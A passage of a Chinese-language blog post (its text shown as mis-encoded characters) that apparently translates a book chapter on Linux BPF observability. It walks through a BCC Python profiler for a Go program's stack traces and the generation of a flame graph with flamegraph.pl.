ˆè·Ÿè¸ªã€‚æˆ‘ä»¬ä½¿ç”¨åˆ†æå™¨æ”¶é›†çš„è½¨è¿¹ç”ŸæˆCPUä¸Šçš„ç«ç„°å›¾ã€‚ä¸ºäº†æµ‹è¯•è¿™ä¸ªåˆ†æå™¨ï¼Œæˆ‘ä»¬å°†ç¼–å†™ä¸€ä¸ªç”ŸæˆCPUè´Ÿè½½çš„æœ€å°Goç¨‹åºã€‚<code>main.go</code>ç¨‹åºä»£ç å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">  j:=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> time.Since(time.Now()) &lt; time.Second &#123; </span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;<span class="number">1000000</span>;i++&#123;</span><br><span class="line">j*=i </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå°†æ­¤ä»£ç ä¿å­˜åœ¨åä¸º<code>main.go</code>çš„æ–‡ä»¶ä¸­å¹¶ä½¿ç”¨<code>go run main.go</code>è¿è¡Œå®ƒæ‚¨ä¼šçœ‹åˆ°ç³»ç»Ÿçš„CPUåˆ©ç”¨ç‡æ˜¾ç€å¢åŠ ã€‚ ä½ å¯ä»¥é€šè¿‡æŒ‰é”®ç›˜ä¸Šçš„<code>Ctrl-C</code>æ¥åœæ­¢æ‰§è¡Œï¼ŒCPUåˆ©ç”¨ç‡å°†æ¢å¤æ­£å¸¸ã€‚</p><p>æˆ‘ä»¬BPFç¨‹åºçš„ç¬¬ä¸€éƒ¨åˆ†å°†åˆå§‹åŒ–åˆ†æå™¨ç»“æ„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;1</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);2</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);3</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1ï¼šåˆå§‹åŒ–ä¸€ä¸ªç»“æ„ï¼Œè¯¥ç»“æ„å°†å­˜å‚¨æˆ‘ä»¬çš„åˆ†æå™¨æ¥æ”¶åˆ°çš„æ¯ä¸ªå †æ ˆå¸§çš„å¼•ç”¨æ ‡è¯†ç¬¦ã€‚ ç¨åæˆ‘ä»¬ä½¿ç”¨è¿™äº›æ ‡è¯†ç¬¦æ¥æ‰¾å‡ºå½“æ—¶æ­£åœ¨æ‰§è¡Œçš„ä»£ç è·¯å¾„ã€‚</p><p>2ï¼šåˆå§‹åŒ–ä¸€ä¸ªBPFå“ˆå¸Œæ˜ å°„ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥èšåˆæˆ‘ä»¬çœ‹åˆ°ç›¸åŒstrackå¸§çš„é¢‘ç‡ã€‚ ç«ç„°å›¾è„šæœ¬ä½¿ç”¨æ­¤èšåˆå€¼æ¥ç¡®å®šæ‰§è¡Œç›¸åŒä»£ç çš„é¢‘ç‡ã€‚</p><p>3ï¼šåˆå§‹åŒ–æˆ‘ä»¬çš„BPFå †æ ˆè·Ÿè¸ªæ˜ å°„ã€‚ æˆ‘ä»¬ä¸ºæ­¤åœ°å›¾è®¾ç½®äº†æœ€å¤§å°ºå¯¸ï¼Œä½†å®ƒå¯èƒ½ä¼šæ ¹æ®è¦å¤„ç†çš„æ•°æ®é‡è€Œæœ‰æ‰€ä¸åŒã€‚å°†è¿™ä¸ªå€¼ä½œä¸ºå˜é‡ä¼šæ›´å¥½ï¼Œä½†æˆ‘ä»¬çŸ¥é“å†™çš„Goåº”ç”¨ç¨‹åºä¸æ˜¯å¾ˆå¤§ï¼Œæ‰€ä»¥10000ä¸ªå…ƒç´ å°±è¶³å¤Ÿäº†ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨åˆ†æå™¨ä¸­å®ç°èšåˆå †æ ˆè·Ÿè¸ªçš„å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;1</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;2</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1ï¼šéªŒè¯å½“å‰BPFä¸Šä¸‹æ–‡ä¸­ç¨‹åºçš„è¿›ç¨‹IDæ˜¯ä¸æ˜¯æˆ‘ä»¬çš„Goåº”ç”¨ç¨‹åºçš„è¿›ç¨‹IDï¼›å¦åˆ™ï¼Œæˆ‘ä»¬å°†å¿½ç•¥è¯¥äº‹ä»¶ã€‚æˆ‘ä»¬ç›®å‰è¿˜æ²¡æœ‰å®šä¹‰<code>PROGRAM_PID</code>çš„å€¼ã€‚åœ¨åˆå§‹åŒ–BPFç¨‹åºä¹‹å‰ï¼Œè®©æˆ‘ä»¬åœ¨åˆ†æå™¨çš„Pythonéƒ¨åˆ†æ›¿æ¢è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™æ˜¯BCCåˆå§‹åŒ–BPFç¨‹åºæ–¹å¼çš„å½“å‰é™åˆ¶ï¼›æˆ‘ä»¬ä¸èƒ½ä»ç”¨æˆ·ç©ºé—´ä¼ é€’ä»»ä½•å˜é‡ï¼Œå¹¶ä¸”ä½œä¸ºä¸€ç§å¸¸è§çš„åšæ³•ï¼Œè¿™äº›å­—ç¬¦ä¸²åœ¨åˆå§‹åŒ–ä¹‹å‰åœ¨ä»£ç ä¸­è¢«æ›¿æ¢ã€‚</p><p>2ï¼šåˆ›å»ºè·Ÿè¸ªä»¥æ±‡æ€»å…¶ä½¿ç”¨æƒ…å†µã€‚æˆ‘ä»¬ä½¿ç”¨å†…ç½®å‡½æ•°<code>get_stackid</code>ä»ç¨‹åºä¸Šä¸‹æ–‡ä¸­è·å–å †æ ˆIDã€‚ è¿™æ˜¯BCCæ·»åŠ åˆ°æˆ‘ä»¬çš„å †æ ˆè·Ÿè¸ªæ˜ å°„çš„è¾…åŠ©å‡½æ•°ä¹‹ä¸€ã€‚æˆ‘ä»¬ä½¿ç”¨æ ‡å¿—<code>BPF_F_USER_STACK</code>æ¥è¡¨ç¤ºæˆ‘ä»¬æƒ³è¦è·å–ç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºçš„å †æ ˆIDï¼Œæˆ‘ä»¬å¹¶ä¸å…³å¿ƒå†…æ ¸å†…éƒ¨å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><p>3ï¼šå¢åŠ è·Ÿè¸ªçš„è®¡æ•°å™¨ä»¥è·Ÿè¸ªç›¸åŒä»£ç çš„æ‰§è¡Œé¢‘ç‡ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦å°†å †æ ˆè·Ÿè¸ªæ”¶é›†å™¨é™„åŠ åˆ°å†…æ ¸ä¸­çš„æ‰€æœ‰<code>Perf</code>äº‹ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])<span class="number">1</span></span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))<span class="number">2</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,<span class="number">3</span></span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>1ï¼šPythonç¨‹åºçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬æ­£åœ¨åˆ†æçš„Goåº”ç”¨ç¨‹åºçš„è¿›ç¨‹æ ‡è¯†ç¬¦ã€‚</p><p>2ï¼šä½¿ç”¨Pythonçš„å†…ç½®æ›¿æ¢å‡½æ•°å°†BPFæºä¸­çš„å­—ç¬¦ä¸²<code>PROGRAM_ID</code>ä¸æä¾›ç»™åˆ†æå™¨çš„å‚æ•°äº¤æ¢ã€‚</p><p>3ï¼šå°†BPFç¨‹åºé™„åŠ åˆ°æ‰€æœ‰è½¯ä»¶<code>Perf</code>äº‹ä»¶ï¼Œè¿™å°†å¿½ç•¥ä»»ä½•å…¶ä»–äº‹ä»¶ï¼Œå¦‚ç¡¬ä»¶äº‹ä»¶ã€‚æˆ‘ä»¬è¿˜å°†BPFç¨‹åºé…ç½®ä¸ºä½¿ç”¨CPUæ—¶é’Ÿä½œä¸ºæ—¶é—´æºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æµ‹é‡æ‰§è¡Œæ—¶é—´ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬éœ€è¦å®ç°åœ¨åˆ†æå™¨ä¸­æ–­æ—¶å°†å †æ ˆè·Ÿè¸ªè½¬å‚¨åˆ°æ ‡å‡†è¾“å‡ºä¸­çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):<span class="number">1</span></span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:<span class="number">2</span></span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):<span class="number">3</span></span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)<span class="number">5</span></span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>1ï¼šéå†æˆ‘ä»¬æ”¶é›†çš„æ‰€æœ‰è·Ÿè¸ªï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æŒ‰é¡ºåºæ‰“å°å®ƒä»¬ã€‚</p><p>2ï¼šéªŒè¯æˆ‘ä»¬æ˜¯å¦è·å¾—äº†å †æ ˆæ ‡è¯†ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç¨åå°†å…¶ä¸ç‰¹å®šçš„ä»£ç è¡Œç›¸å…³è”ã€‚å¦‚æœæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªæ— æ•ˆå€¼ï¼Œæˆ‘ä»¬å°†åœ¨ç«ç„°å›¾ä¸­ä½¿ç”¨ä¸€ä¸ªå ä½ç¬¦ã€‚</p><p>3ï¼šä»¥ç›¸åçš„é¡ºåºéå†å †æ ˆè·Ÿè¸ªä¸­çš„æ‰€æœ‰æ¡ç›®ã€‚æˆ‘ä»¬è¿™æ ·åšæ˜¯å¸Œæœ›åœ¨é¡¶éƒ¨çœ‹åˆ°æœ€è¿‘æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªä»£ç è·¯å¾„ï¼Œå°±åƒåœ¨ä»»ä½•å †æ ˆè·Ÿè¸ªä¸­æ‰€æœŸæœ›çš„é‚£æ ·ã€‚</p><p>4ï¼šä½¿ç”¨BCCå¸®åŠ©ç¨‹åºç¬¦å·å°†å †æ ˆå¸§çš„å†…å­˜åœ°å€è½¬æ¢ä¸ºæˆ‘ä»¬æºä»£ç ä¸­çš„å‡½æ•°åç§°ã€‚</p><p>5ï¼šæ ¼å¼åŒ–ä»¥åˆ†å·åˆ†éš”çš„å †æ ˆè·Ÿè¸ªè¡Œã€‚è¿™æ˜¯ç«ç„°å›¾è„šæœ¬å¸Œæœ›èƒ½å¤Ÿç”Ÿæˆæˆ‘ä»¬çš„å¯è§†åŒ–çš„æ ¼å¼ã€‚</p><p>å®Œæ•´çš„<code>profiler.py</code>ç¨‹åºå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, PerfSWConfig, PerfType</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))</span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,</span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):</span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:</span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):</span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)</span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>éšç€æˆ‘ä»¬çš„BPFåˆ†æå™¨å®Œæˆï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒè¿è¡Œä»¥æ”¶é›†æˆ‘ä»¬Goç¨‹åºçš„å †æ ˆè·Ÿè¸ªã€‚ æˆ‘ä»¬éœ€è¦å°†Goç¨‹åºçš„è¿›ç¨‹IDä¼ é€’ç»™æˆ‘ä»¬çš„åˆ†æå™¨ï¼Œä»¥ç¡®ä¿æˆ‘ä»¬åªæ”¶é›†æ­¤åº”ç”¨ç¨‹åºçš„è·Ÿè¸ªï¼›æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>pgrep</code>æ‰¾åˆ°è¯¥PIDã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å°†Goç¨‹åºè¿è¡Œèµ·æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# go run main.go</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ å°†æ¢æµ‹å™¨ä¿å­˜åœ¨åä¸º<code>profiler.py</code>çš„æ–‡ä»¶ä¸­ï¼Œä¸‹é¢å°±æ˜¯è¿è¡Œæ¢æµ‹å™¨çš„æ–¹å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos flamegraph]# python3 profiler.py `pgrep -nx go` &gt; /tmp/profile.out</span><br></pre></td></tr></table></figure><p><code>pgrep</code>å°†åœ¨PIDä¸­æœç´¢åç§°ä¸goåŒ¹é…çš„ç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹ã€‚æˆ‘ä»¬å°†åˆ†æå™¨çš„è¾“å‡ºå‘é€åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ç”Ÿæˆç«ç„°å›¾å¯è§†åŒ–ã€‚</p><p>æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨<code>Brendan Gregg</code>çš„`FlameGraphè„šæœ¬ä¸ºæˆ‘ä»¬çš„å›¾ç”Ÿæˆä¸€ä¸ªSVGæ–‡ä»¶ï¼› ä½ å¯ä»¥åœ¨<a href="!https://github.com/brendangregg/FlameGraph">GitHub</a>ä¸­æ‰¾åˆ°è¿™äº›è„šæœ¬ã€‚ ä¸‹è½½åå¯ä»¥ä½¿ç”¨ flamegraph.pl ç”Ÿæˆå›¾ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos FlameGraph]# ./flamegraph.pl /tmp/profile.out &gt; /tmp/flamegraph.svg</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€å›¾ç‰‡å¦‚ä¸‹</p><p><img src="/2022/05/27/ä½¿ç”¨BPFçš„Linuxå¯è§‚æµ‹æ€§-ä¸Šç¯‡-ç¿»è¯‘/1.png" alt="1"></p><p>è¿™ç§æ¢æŸ¥å™¨å¯¹äºè·Ÿè¸ªç³»ç»Ÿä¸­çš„æ€§èƒ½é—®é¢˜å¾ˆæœ‰ç”¨ã€‚ BCCå·²ç»åŒ…å«ä¸€ä¸ªæ¯”æˆ‘ä»¬ç¤ºä¾‹ä¸­çš„æ›´é«˜çº§çš„åˆ†æå™¨ï¼Œå¯ä»¥ç›´æ¥åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ã€‚é™¤äº†åˆ†æå™¨ä¹‹å¤–ï¼ŒBCCè¿˜åŒ…æ‹¬äº†å¸®åŠ©ç”ŸæˆCPUå¤–ç«ç„°å›¾å’Œè®¸å¤šå…¶ä»–å¯è§†åŒ–æ¥åˆ†æç³»ç»Ÿçš„å·¥å…·ã€‚</p><h4 id="ç›´æ–¹å›¾"><a href="#ç›´æ–¹å›¾" class="headerlink" title="ç›´æ–¹å›¾"></a>ç›´æ–¹å›¾</h4><p>ç›´æ–¹å›¾æ˜¯æ˜¾ç¤ºå¤šä¸ªå€¼èŒƒå›´å‡ºç°é¢‘ç‡çš„å›¾è¡¨ã€‚è¡¨ç¤ºè¿™ä¸€ç‚¹çš„æ•°å­—æ•°æ®è¢«åˆ†æˆæ¡¶ï¼Œæ¯ä¸ªæ¡¶åŒ…å«æ¡¶å†…ä»»ä½•æ•°æ®ç‚¹çš„å‡ºç°æ¬¡æ•°ã€‚ç›´æ–¹å›¾æµ‹é‡çš„é¢‘ç‡æ˜¯æ¯ä¸ªæ¡¶çš„é«˜åº¦å’Œå®½åº¦çš„ç»„åˆã€‚å¦‚æœæ¡¶è¢«åˆ†æˆç›¸ç­‰çš„èŒƒå›´ï¼Œè¿™ä¸ªé¢‘ç‡åŒ¹é…ç›´æ–¹å›¾çš„é«˜åº¦ï¼Œä½†å¦‚æœèŒƒå›´æ²¡æœ‰è¢«å¹³å‡åˆ’åˆ†ï¼Œä½ éœ€è¦å°†æ¯ä¸ªé«˜åº¦ä¹˜ä»¥æ¯ä¸ªå®½åº¦æ¥æ‰¾åˆ°æ­£ç¡®çš„é¢‘ç‡ã€‚</p><p>ç›´æ–¹å›¾æ˜¯è¿›è¡Œç³»ç»Ÿæ€§èƒ½åˆ†æçš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ã€‚å®ƒä»¬æ˜¯è¡¨ç¤ºå¯æµ‹é‡äº‹ä»¶ï¼ˆå¦‚æŒ‡ä»¤å»¶è¿Ÿï¼‰åˆ†å¸ƒçš„ç»ä½³å·¥å…·ï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºçš„ä¿¡æ¯æ¯”é€šè¿‡å…¶ä»–æµ‹é‡ï¼ˆå¦‚å¹³å‡å€¼ï¼‰è·å¾—çš„æ›´å‡†ç¡®ã€‚</p><p>BPFç¨‹åºå¯ä»¥åŸºäºè®¸å¤šæŒ‡æ ‡åˆ›å»ºç›´æ–¹å›¾ã€‚ä½ å¯ä»¥ä½¿ç”¨BPFå›¾æ¥æ”¶é›†ä¿¡æ¯ï¼Œå°†å…¶åˆ†ç±»åˆ°æ¡¶ä¸­ï¼Œç„¶åä¸ºä½ çš„æ•°æ®ç”Ÿæˆç›´æ–¹å›¾è¡¨ç¤ºã€‚å®ç°è¿™ä¸ªé€»è¾‘å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯å¦‚æœæ¯æ¬¡éœ€è¦åˆ†æç¨‹åºçš„è¾“å‡ºæ—¶éƒ½æƒ³æ‰“å°ç›´æ–¹å›¾å°±ä¼šå˜å¾—ä¹å‘³ã€‚BCCåŒ…å«ä¸€ä¸ªå¼€ç®±å³ç”¨çš„å®ç°ï¼Œå¯ä»¥åœ¨æ¯ä¸ªç¨‹åºä¸­é‡å¤ä½¿ç”¨ï¼Œè€Œæ— éœ€æ¯æ¬¡æ‰‹åŠ¨è®¡ç®—åˆ†æ¡¶å’Œé¢‘ç‡ã€‚</p><p>ä½œä¸ºä¸€ä¸ªæœ‰è¶£çš„å®éªŒï¼Œæˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•ä½¿ç”¨BCCçš„ç›´æ–¹å›¾æ¥å¯è§†åŒ–åº”ç”¨ç¨‹åºè°ƒç”¨<code>bpf_prog_load</code>æŒ‡ä»¤æ—¶åŠ 